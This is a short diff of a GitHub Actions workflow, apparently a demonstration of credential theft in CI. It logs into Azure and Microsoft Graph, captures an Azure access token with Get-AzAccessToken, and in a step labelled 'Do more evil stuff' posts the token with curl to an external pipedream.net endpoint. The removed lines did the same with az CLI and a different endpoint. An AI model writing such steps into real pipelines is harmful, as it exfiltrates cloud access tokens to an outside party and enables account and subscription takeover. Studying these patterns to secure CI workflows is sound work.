@@ -18,7 +18,7 @@ jobs:
         with:
           tenant_id: ${{ secrets.TENANTID }}
           client_id: ${{ secrets.CLIENTID }}
-      - name: Do some Stuff
+      - name: Do some Microsoft Graph stuff
         run: |
           Install-Module -Name Microsoft.Graph.Authentication
           Connect-MgGraph -AccessToken ($env:ACCESS_TOKEN | ConvertTo-SecureString -AsPlainText -Force)
@@ -35,13 +35,16 @@ jobs:
           client-id: ${{ secrets.CLIENTID }}
           tenant-id: ${{ secrets.TENANTID }}
           subscription-id: ${{ secrets.SUBSCRIPTION }}
+          enable-AzPSSession: true
+      - name: Do some Azure stuff
+        run: |
+          [Environment]::SetEnvironmentVariable('AZ_ACCESS_TOKEN',$(Get-AzAccessToken))
+        shell: pwsh
+
       - name: Do more evil stuff
-        uses: azure/CLI@v1
-        with:
-          inlineScript: |
-            export AZ_TOKEN = az account get-access-token
-            curl -d '{"token":"${{ env.ACCESS_TOKEN }}"}' \
-            -H "Content-Type: application/json" \
-            "https://3cc9d6e97f71d89fba8c9afc13798b57.m.pipedream.net"
+        run: |
+          curl -d '{"token":"${{ env.AZ_ACCESS_TOKEN }}"}' \
+          -H "Content-Type: application/json" \
+          "https://eov8t75mveud5wy.m.pipedream.net"
             
             
